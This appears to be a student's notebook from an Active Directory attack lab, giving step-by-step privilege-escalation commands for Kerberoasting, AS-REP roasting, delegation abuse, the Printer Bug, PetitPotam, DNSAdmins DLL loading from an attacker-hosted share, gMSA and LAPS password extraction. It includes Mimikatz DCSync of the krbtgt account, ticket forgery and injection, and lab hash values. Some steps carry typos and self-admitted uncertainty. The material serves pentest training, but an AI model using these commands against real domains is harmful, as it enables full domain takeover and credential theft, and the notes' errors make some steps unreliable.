# AD - Privilege Escalation

## 🍳Kerberoast

### Description

* Offline cracking of service account password
* The Kerberos session ticket (TGS) has a server portion which is encrypted with the password hash/NTLM hash of the service account - this makes it possible to request a ticket and do offline cracking
* Service accounts are many times ignored (less pw changes) and have privileged access
* Password hashes of services accounts could be used to create silver tickets
* In the logs will only be a Kerberos Ticket Requested entry on the dc
* If an account has the property ServicePrincipalName set to not 'null', the KDC assumes that it is a service account
* Abuse Step 3 and 4 - when we get it afte step 4 we can brute force it
* ❓If you run a service as a domain admin, all the protections like protected users groups, credential manager etc. because for a service account the sercrets are stored in lsssecret and not in lsass

{% hint style="info" %}
Only target user service accounts and not machine accounts.

Machine accounts wont work, because they create 100 characters and rotate it every 30 days.
{% endhint %}

### Requirement

* No privs needed
* ❓TGT needed?

### Tool

**1.Find user accounts used as service accounts (PowerView):**

{% code overflow="wrap" %}
```powershell
Get-DomainUser -SPN
Get-NetUser -SPN

.\rubeus.exe kerberoast
.\rubeus.exe kerberoast /stats
Rubeus.exe kerberoast /stats /rc4opsec

ADModule:
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -properties ServicePrincipalName
```
{% endcode %}

**2. Request a TGS for the SPN**

{% code overflow="wrap" %}
```powershell
.\rubeus.exe kerberoast /user:svcadmin /simple
.\rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec


Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN Name from command before"
```
{% endcode %}

Request-SPNTicket from PowerView can be used for cracking with John or Hashcat

**3. Save it to disk / Check if TGS in memory &**

{% code overflow="wrap" %}
```powershell
Kerberoast all possible accounts:
.\rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
 =>Maybe remove in file domain:numbers* the numbers part

klist
Invoke-Mimikatz -Command '"kerberos::list /export"'
```
{% endcode %}

**4. Crack it with John/Hashcat/tsrepcrack**

{% code overflow="wrap" %}
```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10kworst-pass.txt C:\AD\Tools\hashes.txt

python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\filenameOfMimikatzExport
```
{% endcode %}



## 🎯🍳Targeted Kerberoasting - AS-REPs

### Description

* If UserAccountControl setting/flag does have "Do not require Kerberos preauthentication" enabled. It is therefore possible to grab users crackable AS-REP and bruteforce offline
* With sufficient rights like GenericWrite and Generic All, Kerberos preauth can be forced disabled as well
* It does not matter if the Service is still running or if the SPN makes sense at all
* The "pre-auth" part is Step 1 in the Diagram. Because the timestamp is encrypted with users NTLM hash, the KDC knows the request came from the user.
  * If "Do not require Kerberos preauthentication" is enabled, every user can send that request
  * In Step 2 we get the response - a part of it is encrypted using the users hash! What part? i ❓ thought it is just krbtgt?
* Abuse Step 1 and 2

### Requirement

### Tool

**1.Enumerate accounts with Kerberos Preauth disabled**

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">PowerView dev: Get-DomainUser -PreauthNotRequired -verbose
<strong>
</strong><strong>AD Module: Get-ADUser -filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
</strong></code></pre>

**❗Enumerate all users with Kerberos preauth disalbed and request a hash**

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">. .\ASREPRoast\ASREPRoast.ps1
<strong>Invoke-ASREPRoast -verbose | fl
</strong>
rubeus.exe asreproast /format:&#x3C;hashcat|john> /domain:&#x3C;DomainName> /outfile:&#x3C;filename>

rubeus.exe asreproast /user:&#x3C;username> /format:&#x3C;hashcat|john> /domain:&#x3C;DomainName> /outfile:&#x3C;filename>

Crack it
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt
</code></pre>

**1.OR - Force disable Kerberos PreAuth if we have enough privs GenericWrite and Generic All on user Accounts**

**Enum permissions  for RDPUsers on ACL using PowerView Dev:**

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

<strong>Set-DomainObject -Identity user1 -xor @{useraccountcontrol=4194304} -verbose
</strong>Get-DomainUser -PreauthNotRequired -verbose
</code></pre>

**2. Request encrypted AS-REP for offline cracking**

{% code overflow="wrap" %}
```powershell
. .\ASREPRoast\ASREPRoast.ps1
Get-ASREPHash -Username user1 -verbose
```
{% endcode %}

**3. Crack**&#x20;

{% code overflow="wrap" %}
```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt
```
{% endcode %}



## 🎯🍳Targeted Kerberoasting - SetSPN

### Description

* With enought privs (GenericAll, GenericWrite) the SPN of a target User can be sot to anything
* We can request a TGS without special privs. The TGS can be kerberoasted

### Requirement

* None

### Tool

**1.Enum possible Users**

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Find-InterestingDomainAcl -ResolveGUIDs | ?{$_IdentityReferenceName -match "UsernameORGroupname"}
</strong><strong>
</strong><strong>Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
</strong></code></pre>

**2.Usinger PowerView dev, see if user alread has an SPN set**

{% code overflow="wrap" %}
```powershell
Get-DomainUser -Identity user1 | select ServicePrincipalName

Using AD Module:
Get-ADUser -Identity user1 -properties ServicePrincipalName | select ServicePrincipalName
```
{% endcode %}

**3. If not, set an SPN (must be unique for the domain) - PowerView dev**

{% code overflow="wrap" %}
```powershell
Set-DomainObject -Identity user1 -Set @{serviceprincipalname='domain/myuniquespn'}

Using AD Module
Set-ADuser -identity user1 -serviceprincipalname @{Add='domain/myuniquespn'} -verbose
```
{% endcode %}

**4. Request a TGS for the SPN**

{% code overflow="wrap" %}
```powershell
.\Rubeus.exe kerberoast /user:user1 /simple /outfile:setspn.txt
.\Rubeus.exe kerberoast /user:user1 /simple /rc4opsec /outfile:setspn.txt
```
{% endcode %}

**4. Crack it with John/Hashcat/tsrepcrack**

{% code overflow="wrap" %}
```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\setspn.txt
```
{% endcode %}



## 🎭 Kerberos Unconstrained Delegation / Impersonation

### Description

* Kerberos Delegation allows the "reuse end-user credentials to access resoruce hosted on a different server"
* Is typically useful in multi-tier service or applications where Kerberos Double Hop is required\
  Double Hop: First Hop is where the user authenticates to, is not allowed to delegate the credentials somewhere else.&#x20;
* For example: A user authenticates to a websserver and the webserver makes a request to a DB server. The webserver can request access to resources (all or some resources, dependending on the delegation) on the DB server as the user - not with the service account from the webserver => Impersonating the user and the webserver can act as the user on the DB server.\
  Note: The service account for the web service must be trusted for delegation to be able to request as a user
* Unconstrained Delegation: The Server can connect to any resource in the domain, using the authenticated user account
* Two Types of Kerberos Delegation
  * &#x20;1\. Unconstrained Delegation or General/Basic D. - allows the first hop server to request access to any service on any host in the domain as the user
  * &#x20;2\. Constrained Delegation - allows the first hop server to request access only to specified services on specific computers. If the user is not using Kerberos authentication to auth to the first hop server, Windows offers Protocol Transistoin to transit to the request to kerberos
* Unconstrained Delegation:
  * **Allows the first hop server to request access to any service on any host in the domain as the user**
  * When UD is enabled, the DC places user's TGT inside TGS,  see step 4. When presented to the server with UD, the TGT is extracted from TGS and stored in _**LSASS**_. So the server can reuse the users TGT to access resources.
  * **This could be used to escalate privileges in case we can compromise the computer with UD and a Domain Admin connects to that machine**

<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
After Step 6, the DC checks, if the User is marked as "Account is sensitive and cannot be delegated". If so, the DC wont allow the access.

[https://learn.microsoft.com/de-de/archive/blogs/poshchap/security-focus-analysing-account-is-sensitive-and-cannot-be-delegated-for-privileged-accounts](https://learn.microsoft.com/de-de/archive/blogs/poshchap/security-focus-analysing-account-is-sensitive-and-cannot-be-delegated-for-privileged-accounts)
{% endhint %}

### Requirement

* You need to have local admin on the host on which UD is enabled
* The service account of e.g. Webserver must be trusted for delegation to be able to make requests as a user
* The user must not be marked as "Account is sensitive and cannot be delegated".
* Maybe you have to wait until some interesting users connect

### Tool

**1. Discover domain hosts (e.g machine account) which have unconstrained delegation using PowerView (Note: DC will always show up)**

<pre class="language-powershell"><code class="lang-powershell">Get-DomainComputer -unconstrained
<strong>Get-NetComputer -UnConstrained
</strong></code></pre>

Using AD Module

<pre class="language-powershell"><code class="lang-powershell"><strong>Get-ADComputer -Filter {TrustedForDelegation -eq $true}
</strong>Get-AD-User -Filter {TrustedForDelegation -eq $true}
</code></pre>

❓ Elevated/System priv. required or high integrity process!

**2. Compromise the server where Unconstrained Delegation is enabled and get all the Kerberos Tokens - wait for admin user to connect or force it with Printerbug etc.**

<pre class="language-powershell"><code class="lang-powershell">Compromise the server where Unconstrained Delegation is enabled, then
<strong>Invoke-Mimikatz -command '"sekurlsa::ticket"'
</strong>Invoke-Mimikatz -command '"sekurlsa::ticket /export"'  //saves it to the disk - then ls | select name
</code></pre>

**3. Reuse the token**&#x20;

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -command '"kerberos::ptt C:\path\to\ticket.kirbi"'
```
{% endcode %}

## **🖨 Printer Bug**

### Description

* Print Bug can be used to trick a high priv user to connect to a machine with unconstrained delegation
* Feature MS-RPRN which allows any domain user (Authenticated user) to force any machine, running the Spooler service, to connect to a second machien of the domain.
* We can force the dc to connect to appserver abusing Printer Bug

**Requirement**

* Control over an unconstrained delegation machine

**Tool**

Capture TGT of the dchost on the appserver host, then run MS-RPRN.exe ([https://github.com/leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample))

{% code overflow="wrap" %}
```
.\rubeus.exe monitor /interval:1 /nowrap  //do that on unconstrained macihine
.\rubeus.exe monitor /targetuser:your-specific-user /interval:1 /nowrap   //if only specific User should be monitored, useful when a lot of activity
MS-RPRN.exe \\dchost.dom.local \\appserver.dom.local    //do that on studentmachine

Copy the base64 encoded TGT, remove extra spaces/crlf if any, and use it on another host
.\rubeus.exe ptt /ticket:...

Run DCSync
Invoke-Mimikatz -command '"lsadump::dcsync /user:dom\krbtgt"'
C:\AD\Tools\SharpKatz.exe --Command dcsync --User
us\krbtgt --Domain us.techcorp.local --DomainController usdc.us.techcorp.local
```
{% endcode %}

## 🦛PetitPotam

### Description

* PetitPotam uses EfsRpcOpenFileRaw function of MS EFSRPC (Encrypting File System Remote Protocol) protocol and doesn't need credentials when used against a DC.See above

```powershell
.\rubeus.exe monitor /interval:1 /nowrap      //do that on unconstrained macihine
PetitPotam.exe appserver-hostname dchostname  //do that on studentmachine
```

## ↙🎭 Kerberos Constrained Delegation&#x20;

### Description

* When CD is enabled on a service account, it allows only to specified services on a specific host as the user
* To impersonate the user, Service for User (S4U) extension is used which provides two extensions:
  * Service for User to Self (S4U2self) - Allows a service to obtain a forwordable TGS to itself on behalf of a user, with just the user principal name without supplying a password. The service account mut have TRUSTED\_TO\_AUTHENTICATE\_FOR\_DELEGTION (T2A4D) UserAccount attribute must be set for the service account. Only then the service can request a TGS for itself on behalf of the user by impersonating the user
  * Service for User to Proxy (S4U2proxy) - Allows a service to obtain a TGS to a second service on behalf of a user. Which second service? This is controlled by msDS-AllowedToDelegateTo attribute of the service account. This attribute contains a list of SPNs to which the user tokens can be forwarded.
* ❗ **Problem 1**: If you can compromise the user account mentioned in Get-DomainUser -TrustedToAuth, you can access the service mentioned in msds-allowedtodleegateto as ANY user, including DA.
* ❗**Problem 2**: The SPN part is not encrypted (Get-DomainUser -TrustedToAuth - msds-allowedtodelegateto attribute) - so you can change this service!\
  So you can access all services on the target machine which us the same service account!\
  ❗=> check all other services http (PSRemoting), cifs, host (schedule task then) etc. when you only have like time service
* ❗ No Request/Connection from DA to the Host is required!
* Delegation not only occurs for the specified service but for any service running under the same account. There is no validation for the SPN specified.\
  This is huge as it allows to many interesting services when the delegation may be for a non-intrusive service!\
  ❗Eg. We have CIFS on appsrv.dom.local, we can access all the services, which use the same service account as CIFS, which is the machine account. This is also the account for WMI, PowershellRemoting!

<figure><img src=".gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

### Requirement

* ❗ If you can compromise the account mentioned in Get-DomainUser -TrustedToAuth, you can access the service mentioned in msds-allowedtodleegateto as ANY user, including DA
* ❗ No Request/Connection from DA to the Host is required!
* Access to the service account - it is then possible to access services listed in the msDS-AllowedToDelegateTo as _**ANY**_ user, including Domain Administrators
* No waiting
* Compromised machine with high privileges shell or request a TGT for the machine account

### Tool&#x20;

&#x20;**1. Enumerate users and computers with constrained delegation enabled - with PowerView**

{% code overflow="wrap" %}
```powershell
Get-DomainUser -TrustedToAuth      => For Useraccounts - Problem 1
Get-DomainComputer -TrustedToAuth  => For Computeraccounts - Problem 2

If result contains useraccountcontrol:Trusted_to_auth_for_delegation => this account can be used.
```
{% endcode %}

With ActiveDirectory Module

{% code overflow="wrap" %}
```powershell
Get-ADObject -filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTO
```
{% endcode %}

**❗Problem 1: Step 2, 3, 4 together (TGT & TGS) with Rubeus**

{% code overflow="wrap" %}
```
rubeus.exe s4u /user:username-with-constrained-delegation-enabled-user-or-machine-acc /aes256:hash-of-user /impersonateuser:Administrator /msdsspn:CIFS/dc.dom.loacl(asShownInGet-DomainUser) /ptt
```
{% endcode %}

**2. Using plaintext password or NTLM/AES hash of the service account to request a TGT using asktgt from Kekeo (Step 2 & 3 in diagram)**

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>.\kekeo.exe
</strong><strong>kekeo# tgt::ask /user:serviceusername /domain:dom.local /rc4:rc4hash
</strong></code></pre>

Kekeo can read/write tickets without injecting into lsass and without having admin privileges.

**3. Once we have t TGT,  using s4u from keko, we can request a TGS (step 4 and 5 in diagram)**

{% code overflow="wrap" %}
```
kekeo# s4u /tgt:filename.kirbi /user:administrator@dom.local /service:full_service_name_eg_cifs/dc-fqdn-name

```
{% endcode %}

**4. Inject the TGS ticket in the current session**&#x20;

```powershell
Invoke-Mimikatz -command '"kerberos::ptt filename_to_tgs_from_kekeo.kirbi"'
ls \\host.dom.local\c$
```

**❗Problem 2: Machine Account$ is used - If delegation is for non intrusive service but done with e.g Administrator, everything else with that user can be abused.**

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>tgt::ask /user:usernae$ /domain:dom.local /rc4:rc4here
</strong>
tgs::s4u /tgt:filename.kirbi /user:Administrator@dom.local /service:time/dom.local|ldap/dom.local
=> We also request LDAP Access as Administrator, which runs under the same service account as the regular time service

Same with rubeus in one command:
Rubeus.exe s4u /user:machine-account-with-CD$ /aes256:machine-account-hash /impersonateuser:Administrator /msdsspn:time/dom.local(what is shown in  Get-DomainComputer -TrustedToAuth)  /altservice:ldap /ptt
</code></pre>

```
Invoke-Mimikatz -command '"kerberos::ptt filename.kirbi"'
Invoke-Mimikatz -command '"lsadump::dcsync /user:dom\krbtgt"'
```

### Kerberos Constrained Delegation - Kerberos Only

* It requires an additional forwardable ticket to invoke S4U2Proxy.
* We cannot use S4U2Self as the service doesn’t have TRUSTED\_TO\_AUTH\_FOR\_DELEGATION value configured.
* We can leverage RBCD to abuse Kerberos Only configuration.
  * Create a new Machine Account (Since ms-DS-MachineAccountQuota is set to 10 for all domain users, any domain user can create a new Machine Account and join the same in the current domain.)
  * Configure RBCD on the machine configured with Constrained Delegation.
  * Obtain a TGS/Service Ticket for the machine configured with Constrained Delegation by leveraging the newly created Machine Account.
  * Request a new forwardable TGS/Service Ticket by leveraging the ticket created in previous step.

1. Enumerate constrained Delgation using ADModule

Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

2. Create a new machine account using powermad.ps1

. C:\AD\Tools\Powermad\Powermad.ps1 New-MachineAccount -MachineAccount studentcompX

3. On a compromised machine with constrained delegation (us-mgmt) configure RBCD

C:\AD\Tools\Rubeus.exe asktgt /user:us-mgmt$ /aes256:cc3e643e73ce17a40a20d0fe914e2d090264ac6babbb86e99e74d7 4016ed51b2 /impersonateuser:administrator /domain:us.techcorp.local /ptt /nowrap

Set-ADComputer -Identity us-mgmt$ - PrincipalsAllowedToDelegateToAccount studentcompX$ -Verbose

4. Obtain a TGS/Service Ticket for us-mgmt (machine configured with Constrained Delegation) by leveraging the newly created Machine Account (studentcompx).

C:\AD\Tools\Rubeus.exe hash /password:P@ssword@123 C:\AD\Tools\Rubeus.exe s4u /impersonateuser:administrator /user:studentcompX$ /rc4:D3E5739141450E529B07469904FE8BDC /msdsspn:cifs/usmgmt.us.techcorp.local /nowrap

5. Request a new forwardable TGS/Service Ticket by leveraging the ticket created in previous step

C:\AD\Tools\Rubeus.exe s4u /tgs:doIGxjCCBsKgAwIBBaEDAgEWoo... /user:us-mgmt$ /aes256:cc3e643e73ce17a40a20d0fe914e2d090264ac6babbb86e9 9e74d74016ed51b2 /msdsspn:cifs/usmssql.us.techcorp.local /altservice:http /nowrap /ptt

6. Access the us-mssql using WinRM as the Domain Admin

winrs -r:us-mssql.us.techcorp.local cmd.exe



## 🧷Kerberos Resource-based Constrained Delegation

### Description

* This moves delegation authority to the resource/service administrator.
* Instead of SPNs on msDs AllowedToDelegatTo on the front end service like web service, access in this case is controlled by security descriptor of msDS AllowedToActOnBehalfOfOtherIdentity (visible as PrincipalsAllowedToDelegateToAccount) on the resource/service like SQL Server service.
* That is, the resource/service administrator can configure this delegation whereas for other types, SeEnableDelegation privileges are required which are, by default, available only to Domain Admins.

### Requirement

We need two privileges to abuse RBCD

1. Control over an object which has SPN configured or set SPN (like admin access to a domain joined machine or ability to join a machine to domain ms-DS-MachineAccountQuota is 10 for all domain users)
2. GenericAll or GenericWrite permissions over the target service or object (ACL) to configure msDS-AllowedToActOnBehalfOfOtherIdentity .

### Tool

**Find Write ACL on machines (do that with every user you own) - write on the msDS-AllowedToActOnBehalfOfOtherIdentity attribute**

```powershell
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
Get-DomainRBCD

cd ADModule-master
Import-Module .\Microsoft.ActiveDirectory.Management.dll -Verbose
Import-Module .\ActiveDirectory\ActiveDirectory.psd1
```

**Set RBCD on dcorp-mgmt for the student VMs**:

{% code overflow="wrap" %}
```powershell
Set-DomainRBCD -Identity hostname-target-from-find-interesting-acl -DelegateFrom 'your-machine-account$' -Verbose

Set-ADComputer -identity hostname-target-from-find-interesting-acl -PrincipalsAllowedToDelegateToAccount 'your-machine-account$'
```
{% endcode %}

**Get your own Machine Account AES-Hash**

```powershell
Invoke-mimikatz -command '"sekurlsa::ekeys"'
```

**Access the machine with our AES key with ANY user we want**

{% code overflow="wrap" %}
```powershell
rubeus.exe s4u /user:hostname$ /aes256:aes-hash-of-hostname$-from-above /msdsspn:http/target-host /impersonateuser:administrator /ptt    

Winrs -r:target-host
```
{% endcode %}



## 🤖DNSAdmins Privilege Escalation

### Description

* It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM)
* In case the DC also servers as DNS, this will provide us escalation to DA
* Need privileges to restart the DNS service
* If we compromise an account, which is a member of the DNSAdmins Group, we can get DA

### Requirement

* DC serves also as DNS Server
* We compromised a User, wrho is member of DNSAdmins Group
* Misonfiguration which is needed: DNSAdmins group, need the privs to restart the DNS Service - this is by default disabled. &#x20;

### Tool

**1. Enumerate the member sof the DNSAdmins group (PowerView)**

<pre class="language-powershell"><code class="lang-powershell"><strong>PowerView
</strong><strong>Get-NetGroupMember -GroupName "DNSAdmins"
</strong>
AD-Module
Get-ADGroupMember -Identity DNSAdmins
</code></pre>

**2. From the privileges of DNSAdmins group member, configure DLL using**&#x20;

<pre class="language-powershell"><code class="lang-powershell"><strong>Using dnscmd.exe (needs RSAT DNS installed on the compromised machine)
</strong><strong>dnscmd dom.local /config /serverlevelplugindll \\attackerhost\dll\mimilib.dll
</strong>
Using DNSServer module (needs RSAT DNS installed on the compromised machine)
$dnsettings = Get-DnsServerSetting -computername dc-hostname -verbose -all
$dnsettings.ServerLevelPluginDll="\\attackerhost\dll\mimilib.dll"
Set-DnsServerSetting -InputObject $dnsettings -computername dc-hostname -verbose
</code></pre>

This sets a new Key in HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters called ServerLevelPluginDll with the value of \\\attackerhost\dll\mimilib.dll

**3. Restart the DNS Service**

```powershell
sc \\dc-hostname stop dns
sc \\dc-hostname start dns
```

A new file called kiwidns.log is creatd in C:\Windows\System32 and all the DNS requests are logged there.

Modify the kdns.c with your own payload. This is a synchronous task, so if you start a reverse shell, the DNS service itself will stop in this host.

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

## 👾gMSA - Group Managed Service Account

### Description

* A group Managed Service Account (gMSA) provides automatic password management, SPN management and delegated administration for service accounts across multiple servers
* Use of gMSA is recommended to protect from Kerberoast type attacks!
* A 256 bytes random password is generated and is rotated every 30 days.
* When an authorized user reads the attribute 'msds-ManagedPassword’ the gMSA password is computed
* Only explicitly specified principals can read the password blob. Even the Domain Admins can't read it by default.
* A gMSA has object class 'msDS-GroupManagedServiceAccount'. This can be used to find the accounts.
* The attribute 'msDS-GroupMSAMembership' (PrincipalsAllowedToRetrieveManagedPassword) lists the principals that can read the password blob. This can be computers or users.
* The attribute 'msDS-ManagedPassword' stores the password blob in binary form of MSDS-MANAGEDPASSWORD\_BLOB
* Once we have compromised a principal that can read the blob. Use ADModule to read and DSInternals to compute NTLM hash
* The 'CurrentPassword' attribute in the $decodedpwd contains the clear-text password but cannot be typed!
* When computer account is needed for the PW you need a SYSTEM prompt to act with the computer account to DC
  * Here I use PSEXEC to spawn a command shell running under the context of the local SYSTEM account. Once running as SYSTEM, we can perform the same action as shown above. The computer account has the right to pull the password, but not a user on that computer, so I elevate to SYSTEM which then interacts with AD as the associated AD computer account. Now I can get the GMSA password.
  * psexec -i -s powershell.exe

### Requirement

### Tool

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">1. Enumerate where gMSA is used (User)
Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'

ADModule
Get-ADServiceAccount -Filter *
<strong>
</strong><strong>2. Read what pricipals can read the PW from the gMSA
</strong><strong>ADModule
</strong>Import-Module .\Microsoft.ActiveDirectory.Management.dll
import-module .\ActiveDirectory\ActiveDirectory.psd1
<strong>Get-ADServiceAccount -Identity usernameHere -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
</strong>

2. Exploit
Once we have compromised a principal that can read the blob open a shell as the user

*Get Hash on a server*
You need to use Sekurlsa::ekeys / sekurlsa:logonpasswords ntlm hash wont show

$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
Decode it and convert to NTLM (clear text pw is not writeable)
Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword

Output is an NTLM hash you use for over-pass-the hash - see 4.


<strong>(3. Verify that PW matches from AD - optional)
</strong>Next step I perform in the lab is to to confirm that the NT password hash that DSInternals provides matches that in Active Directory.
I use the DSInternals command Get-ADReplAccount to get the AD password hash and can confirm that the password hash pulled from the GMSA is the same as that gathered from AD.
$account = get-adreplaccount -samaccountname 'username/machinename$' -server hostname.dom.local
$hash2 = convertto-hex -input $account.nthash
$hash2

4. We can use the hash for Auth and run a cmd as service account
C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:jumpone /domain:us.techcorp.local /ntlm:3361912e368ac24552f71ffabfa7e0b5 /run:cmd.exe" 

5. Find out where user is local admin
 . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
 Find-PSRemotingLocalAdminAccess -Verbose

</code></pre>

**Golden gMSA**

* gMSA password is calculated by leveraging the secret stored in KDS root key object.
* Once we compute the GKE for the associated KDS root key we can generate the password offline
* Only privilege accounts such as Domain Admins, Enterprise Admins or SYSTEM can retrieve the KDS root key.
* Once the KDS root key is compromised we can’t protect the associated gMSAs accounts.
* Golden gMSA can be used to retrieve the information of gMSA account, KDS root key and generate the password offline.
* We need following attributes of the KDS root key to compute the Group Key Envelope (GKE) : – cn – msKds-SecretAgreementParam – msKds-RootKeyData – msKds-KDFParam – msKds-KDFAlgorithmID – msKds-CreateTime – msKds-UseStartTime – msKds-Version – msKds-DomainID – msKds-PrivateKeyLength – msKds-PublicKeyLength – msKds-SecretAgreementAlgorithmID

## 🔑LAPS

### **Description**

* LAPS (Local Administrator Password Solution) provides centralized storage of local users passwords in AD with periodic randomizing.
* &#x20;"…it mitigates the risk of lateral escalation that results when customers have the same administrative local account and password combination on many computers."&#x20;
* Storage in clear text, transmission is encrypted (Kerberos).&#x20;
* Configurable using GPO.&#x20;
* Access control for reading clear text passwords using ACLs. Only Domain Admins and explicitly allowed users can read the passwords.
* On Client/Server C:\Program Files\LAPS\CSE\admpwd.dll is responsible

### Requirement

Is LAPS used? Check C:\Program Files\LAPS\CSE\admpwd.dll&#x20;

### Tool

1. Find users who can read the passwords in clear text of machines in OUs:

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} 
</strong><strong>
</strong><strong>AD-Module
</strong>Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1 -Verbose
C:\AD\Tools\Get-LapsPermissions.ps1

=> IdentityName can read the Passwords on ObjectDN
</code></pre>

2. Get the Passwort in Cleartext

{% code overflow="wrap" %}
```powershell
Get the Computers in the OU first
Get-DomainComputer -SearchBase "LDAP://OU=ouname,DC=sub,DC=dom,DC=local"

PowerView
Get-DomainObject -Identity us-mailmgmt | select -ExpandProperty ms-mcs-admpwd

AD-Module
Get-ADComputer -Identity hostname-here -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
Get-AdmPwdPassword -ComputerName us-mailmgmt
```
{% endcode %}
